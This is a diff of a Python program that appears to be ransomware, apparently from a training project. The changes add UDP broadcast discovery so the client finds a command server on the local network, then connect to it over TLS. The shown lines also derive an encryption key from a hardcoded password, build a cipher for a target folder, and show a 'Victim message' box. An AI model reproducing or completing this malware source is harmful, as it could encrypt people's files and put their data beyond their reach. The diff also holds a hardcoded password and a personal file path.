@@ -16,11 +16,19 @@ import json
 
 import subprocess
 
-IP = "127.0.0.1"
-PORT = 9443
-def create_conn():
+
+def find_server_address(brodcast_port):
+    discovery = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    discovery.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST,1)
+
+    discovery.sendto(b"DISCOVER_SERVER",("255.255.255.255",brodcast_port))
+
+    msg,server_addr = discovery.recvfrom(1024)
+    return server_addr
+
+def create_conn(ip,port):
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    client_socket.connect((IP,PORT))
+    client_socket.connect((ip,port))
     print("Connected!")
     return client_socket
 
@@ -94,10 +102,17 @@ def show_clipboard_msg():
     messagebox.showinfo("Victim message","copied key to clipboard")
 
 def main():
-    conn = create_conn()
+
+    PORT = 9443
+    BRODCAST_PORT = 8080
+    REMOTE_ADRESS = find_server_address(BRODCAST_PORT)
+    IP = REMOTE_ADRESS[0]
+
+    conn = create_conn(IP,PORT)
     secured_conn = wrap_conn(conn,"server.crt")
     path = r"C:\Users\Sahar Levy\Desktop\Projects\test_folder"
     # path = r"C:\Users\Pc2\test_folder"
+    # path = r"C:\Users\Sahar Levy\Desktop\test_folder"
     password = "gamma_cyber_youngfortech"
     key = create_encryption_key(password)
     cipher = transfer_key_to_cipher(key)
